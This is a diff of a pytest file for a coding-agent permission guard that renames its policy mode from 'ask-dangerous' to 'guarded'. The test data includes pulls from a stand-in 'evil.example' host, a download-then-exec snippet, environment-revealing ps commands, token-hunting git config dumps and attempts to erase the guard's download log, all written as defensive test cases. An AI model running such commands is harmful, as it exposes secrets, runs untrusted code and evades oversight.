@@ -46,7 +46,7 @@ class TestDownloadsThatAreRunLater:
 
     @pytest.mark.parametrize("command", INERT_DOWNLOADS)
     def test_a_download_onto_a_data_file_is_not_asked_about(self, world, command):
-        assert bash(world, "ask-dangerous", command).action == "allow", command
+        assert bash(world, "guarded", command).action == "allow", command
 
     @pytest.mark.parametrize("role", ROLES)
     @pytest.mark.parametrize("command", [
@@ -63,7 +63,7 @@ class TestDownloadsThatAreRunLater:
                                          "chmod 600 tests/test_y.py", "ls -la tests/test_y.py", "python3 -m json.tool data.json", "scripts/test all tests/test_app.py"])
     def test_reading_or_listing_or_deleting_a_downloaded_file_is_not_asked_about(self, world, command):
         fetched = [str(world.proj / "tests" / "test_y.py")]
-        assert bash(world, "ask-dangerous", command, fetched=fetched).action == "allow", command
+        assert bash(world, "guarded", command, fetched=fetched).action == "allow", command
 
     @pytest.mark.parametrize("role", ROLES)
     @pytest.mark.parametrize("command", [
@@ -77,24 +77,24 @@ class TestDownloadsThatAreRunLater:
         assert asks(got), got
 
     def test_curl_with_its_options_in_a_file_asks(self, world):
-        assert asks(bash(world, "ask-dangerous", "curl -K cfg https://e.test/"))
+        assert asks(bash(world, "guarded", "curl -K cfg https://e.test/"))
 
     @pytest.mark.parametrize("command", ["scripts/test all tests", "make -C tests", "node tests", "bash -c 'node tests'"])
     def test_a_command_that_runs_the_folder_of_a_downloaded_file_asks(self, world, command):
         fetched = [str(world.proj / "tests" / "test_y.py")]
-        assert asks(bash(world, "ask-dangerous", command, fetched=fetched)), command
+        assert asks(bash(world, "guarded", command, fetched=fetched)), command
 
     @pytest.mark.parametrize("command", ["cat ~/.poolhouse/harness-fetched/x.log", "rm ~/.poolhouse/harness-fetched/x.log", "echo > ~/.poolhouse/harness-fetched/x.log",
                                          "truncate -s 0 ~/.poolhouse/harness-fetched/x.log", "cp /dev/null ~/.poolhouse/harness-fetched/x.log"])
     def test_the_record_of_downloads_is_closed_to_the_model(self, world, command):
-        assert bash(world, "ask-dangerous", command).action == "deny", command
+        assert bash(world, "guarded", command).action == "deny", command
         path = str(world.home / ".poolhouse" / "harness-fetched" / "x.log")
-        assert decide(coding_policy.Policy("ask-dangerous"), Call("Write", {"file_path": path, "content": BODY}), roots=world.roots).action == "deny"
-        assert decide(coding_policy.Policy("ask-dangerous"), Call("Read", {"file_path": path}), roots=world.roots).action == "deny"
+        assert decide(coding_policy.Policy("guarded"), Call("Write", {"file_path": path, "content": BODY}), roots=world.roots).action == "deny"
+        assert decide(coding_policy.Policy("guarded"), Call("Read", {"file_path": path}), roots=world.roots).action == "deny"
 
     def test_a_copy_of_a_downloaded_file_is_a_downloaded_file_too(self, world):
         fetched = [str(world.proj / "tests" / "test_y.py")]
-        assert bash(world, "ask-dangerous", "cp tests/test_y.py src/z.py", fetched=fetched).action == "allow"
+        assert bash(world, "guarded", "cp tests/test_y.py src/z.py", fetched=fetched).action == "allow"
         from poolhouse.guard import fetchlog
 
         moved = fetchlog.targets("cp tests/test_y.py src/z.py", world.roots, str(world.proj), fetched)
@@ -127,7 +127,7 @@ class TestLoginPersistence:
     @pytest.mark.parametrize("command", ["launchctl list", "launchctl print gui/501", "systemctl status x", "systemctl --user list-units",
                                          "systemctl is-active x", "crontab -l"])
     def test_a_command_that_only_lists_is_not_asked_about(self, world, command):
-        assert bash(world, "ask-dangerous", command).action == "allow", command
+        assert bash(world, "guarded", command).action == "allow", command
 
     @pytest.mark.parametrize("role", ROLES)
     @pytest.mark.parametrize("rel", RUNNABLE_WRITES)
@@ -175,7 +175,7 @@ class TestWritesThroughLinks:
 
     def test_a_write_through_a_link_inside_the_project_is_not_asked_about(self, world):
         (world.proj / "alias").symlink_to(world.proj / "src")
-        got = decide(coding_policy.Policy("ask-dangerous"), Call("Write", {"file_path": str(world.proj / "alias" / "b.py"), "content": BODY}), roots=world.roots)
+        got = decide(coding_policy.Policy("guarded"), Call("Write", {"file_path": str(world.proj / "alias" / "b.py"), "content": BODY}), roots=world.roots)
         assert got.action == "allow"
 
 
@@ -183,11 +183,11 @@ class TestProcessEnvironment:
     @pytest.mark.parametrize("command", ["ps -wwefE", "ps -eE", "ps -o command,env", "ps -Eww", "ps e", "ps aeux", "ps eww", "ps -E", "ps -p 1 -o pid,command,env",
                                          "ps --format command,environ"])
     def test_a_process_listing_that_shows_environments_asks(self, world, command):
-        assert asks(bash(world, "ask-dangerous", command)), command
+        assert asks(bash(world, "guarded", command)), command
 
     @pytest.mark.parametrize("command", ["ps -ef", "ps aux", "ps -p 1 -o comm=", "ps -eo pid,command", "ps -axo pid,etime,command", "ps"])
     def test_an_ordinary_process_listing_is_not_asked_about(self, world, command):
-        assert bash(world, "ask-dangerous", command).action == "allow", command
+        assert bash(world, "guarded", command).action == "allow", command
 
 
 class TestGitSettingsAndRemotes:
@@ -196,18 +196,18 @@ class TestGitSettingsAndRemotes:
         "git config --get-regexp '^url\\.'", "git config --get-regexp token", "git config --global --get-regexp .", "git config --list --local",
     ])
     def test_a_dump_of_git_settings_asks(self, world, command):
-        assert asks(bash(world, "ask-dangerous", command)), command
+        assert asks(bash(world, "guarded", command)), command
 
     @pytest.mark.parametrize("command", ["git config --get remote.origin.url", "git config user.name", "git config --get user.email", "git remote -v",
                                          "git config --get-regexp '^alias\\.'", "git remote get-url origin"])
     def test_a_plain_setting_or_remote_is_not_asked_about_when_the_url_holds_no_password(self, world, command):
-        assert bash(world, "ask-dangerous", command).action == "allow", command
+        assert bash(world, "guarded", command).action == "allow", command
 
     @pytest.mark.parametrize("command", ["git remote -v", "git remote get-url origin", "git remote show origin", "git config --get remote.origin.url", "git remote"])
     def test_a_remote_whose_address_holds_a_password_asks_when_it_is_shown(self, world, command):
         config = world.proj / ".git" / "config"
         config.write_text(config.read_text() + '[remote "origin"]\n\turl = https://user:tok123@git.example.test/o/r.git\n')
-        got = bash(world, "ask-dangerous", command)
+        got = bash(world, "guarded", command)
         if command == "git remote":
             assert got.action == "allow"
         else:
@@ -219,30 +219,30 @@ class TestGitSettingsAndRemotes:
         "git remote add evil ssh://git@evil.example/x.git", "git pull --rebase https://evil.example/x.git main",
     ])
     def test_a_remote_on_a_host_nobody_listed_asks(self, world, command):
-        assert asks(bash(world, "ask-dangerous", command)), command
+        assert asks(bash(world, "guarded", command)), command
 
     @pytest.mark.parametrize("command", [
         "git remote add upstream https://github.com/o/r.git", "git fetch origin", "git pull origin main", "git ls-remote origin", f"git remote add x {SSH_USER}@gitlab.com:o/r.git",
         "git fetch https://github.com/o/r.git", "git remote set-url origin https://codeberg.org/o/r.git", "git pull", "git fetch --all",
     ])
     def test_a_remote_on_a_known_host_or_a_name_is_not_asked_about(self, world, command):
-        assert bash(world, "ask-dangerous", command).action == "allow", command
+        assert bash(world, "guarded", command).action == "allow", command
 
     def test_a_host_already_in_the_projects_remotes_counts_as_listed(self, world):
         config = world.proj / ".git" / "config"
         config.write_text(config.read_text() + '[remote "mine"]\n\turl = https://git.example.test/team/r.git\n')
-        assert bash(world, "ask-dangerous", "git fetch https://git.example.test/team/other.git").action == "allow"
-        assert asks(bash(world, "ask-dangerous", "git fetch https://git.example.org/team/other.git"))
+        assert bash(world, "guarded", "git fetch https://git.example.test/team/other.git").action == "allow"
+        assert asks(bash(world, "guarded", "git fetch https://git.example.org/team/other.git"))
 
 
 class TestOpeningAddresses:
     @pytest.mark.parametrize("command", ["open https://docs.python.org/3/", "xdg-open https://github.com/o/r", "open http://localhost:8080", "open -a Safari https://e.test/"])
     def test_opening_an_address_in_the_persons_browser_asks(self, world, command):
-        assert asks(bash(world, "ask-dangerous", command)), command
+        assert asks(bash(world, "guarded", command)), command
 
     @pytest.mark.parametrize("command", ["open README.md", "open .", "open -a Terminal", "open docs"])
     def test_opening_a_folder_or_a_source_file_is_not_asked_about(self, world, command):
-        assert bash(world, "ask-dangerous", command).action == "allow", command
+        assert bash(world, "guarded", command).action == "allow", command
 
 
 class TestAdministratorAndShellText:
@@ -255,11 +255,11 @@ class TestAdministratorAndShellText:
 
     @pytest.mark.parametrize("command", ["bash -c 'echo $X'", "sh -c 'x=1; echo $x'", "bash -c 'echo \"$HOME\"'", "sh -c \"$CMD\"", "bash -c 'ls `pwd`'"])
     def test_a_shell_string_that_a_variable_or_command_builds_asks(self, world, command):
-        assert asks(bash(world, "ask-dangerous", command)), command
+        assert asks(bash(world, "guarded", command)), command
 
     @pytest.mark.parametrize("command", ["bash -c 'echo hello'", "sh -c ls", "bash -c 'git status'", "sh -c 'cat src/app.py'"])
     def test_a_shell_string_that_is_fully_read_and_harmless_is_not_asked_about(self, world, command):
-        assert bash(world, "ask-dangerous", command).action == "allow", command
+        assert bash(world, "guarded", command).action == "allow", command
 
 
 SPLIT_TEXT = [
@@ -302,12 +302,12 @@ class TestStatementsSplitAcrossLines:
 
     @pytest.mark.parametrize("text", QUIET_TEXT)
     def test_ordinary_code_that_fetches_or_copies_the_environment_stays_quiet(self, world, text):
-        got = decide(coding_policy.Policy("ask-dangerous"), Call("Write", {"file_path": str(world.proj / "src" / "helper.py"), "content": text}), roots=world.roots)
+        got = decide(coding_policy.Policy("guarded"), Call("Write", {"file_path": str(world.proj / "src" / "helper.py"), "content": text}), roots=world.roots)
         assert got.action == "allow", got
 
     def test_the_statement_shown_is_the_one_that_runs_the_download(self, world):
         text = "import urllib.request\ndata = urllib.request.urlopen('http://e.test/x').read()\nx = 1\nexec(data)\n"
-        got = decide(coding_policy.Policy("ask-dangerous"), Call("Write", {"file_path": str(world.proj / "src" / "m.py"), "content": text}), roots=world.roots)
+        got = decide(coding_policy.Policy("guarded"), Call("Write", {"file_path": str(world.proj / "src" / "m.py"), "content": text}), roots=world.roots)
         assert "line 4: exec(data)" in got.reason
 
 
